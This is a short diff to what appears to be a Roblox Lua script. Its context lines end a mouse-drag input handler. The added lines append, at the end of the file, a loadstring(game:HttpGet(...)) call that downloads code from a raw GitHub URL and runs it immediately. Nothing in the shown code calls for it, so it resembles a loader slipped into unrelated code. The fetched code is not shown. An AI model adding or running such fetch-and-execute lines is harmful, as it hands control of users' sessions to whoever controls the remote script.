@@ -315,3 +315,5 @@ UserInputService.InputEnded:Connect(function(i)
 		dragging=false
 	end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nikita47475/nikita-mod/refs/heads/main/nikita-mod4"))(1)
